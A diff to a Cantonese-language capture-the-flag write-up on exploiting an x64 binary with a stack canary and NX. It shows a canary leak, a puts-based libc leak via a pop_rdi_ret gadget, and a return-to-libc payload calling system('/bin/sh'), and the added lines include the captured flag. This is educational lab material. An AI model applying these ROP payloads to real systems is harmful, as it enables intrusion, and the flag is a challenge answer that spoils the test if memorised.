@@ -96,7 +96,7 @@ leak canary payload= payload='b'*167+'a'+'g'
 
 由於有nx,所以只可以rop return to libc解決
 
-由於係x64,x64有calling convention,puts係讀rdi嘅parameters,所以就一個pop_rdi_ret gadget mov puts or whatever got 入去,puts_plt print
+由於係x64,x64有calling convention,puts係讀rdi嘅parameters,所以就一個pop_rdi_ret gadget mov puts or whatever got 入去,俾puts_plt print
 
 Print 完再彈返去main
 
@@ -114,7 +114,14 @@ payload='b'*167+'a'+p64(canary)+"\x90"*8+p64(pop_rdi_ret)+p64(PUTSGOT)+p64(PUTSP
 拎晒libc_base 之後,加返d offset,係入buffer個個位入:
 
 ```python
+
 payload='b'*167+'a'+p64(canary)+"\x90"*8+p64(pop_rdi_ret)+p64(libc_bin_sh)+p64(system)+p64(main)
 
 ```
-exit 彈shell 
+
+禁exit 就會彈shell 
+
+```
+flag: flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
+
+```
